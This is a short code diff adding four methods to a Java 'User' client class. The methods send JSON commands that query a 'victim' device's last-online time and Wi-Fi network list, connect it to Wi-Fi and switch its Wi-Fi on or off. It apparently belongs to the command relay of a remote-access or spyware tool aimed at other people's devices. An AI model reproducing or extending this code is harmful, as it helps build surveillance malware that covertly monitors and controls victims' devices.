@@ -215,4 +215,36 @@ public class User extends Client {
         sendMessage(query);
     }
 
+    void sendGetLastOnline(String lastOnline, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.last.online");
+        query.put("lastOnline", lastOnline);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    void sendGetWifiList(JSONArray wifiList, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.wifi.list");
+        query.put("wifiList", wifiList);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    void sendWifiConnect(String code, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "wifi.connect");
+        query.put("code", code);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    void sendSetWifiEnabled(boolean wifiState, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "set.wifi.enabled");
+        query.put("wifiState", wifiState);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
 }
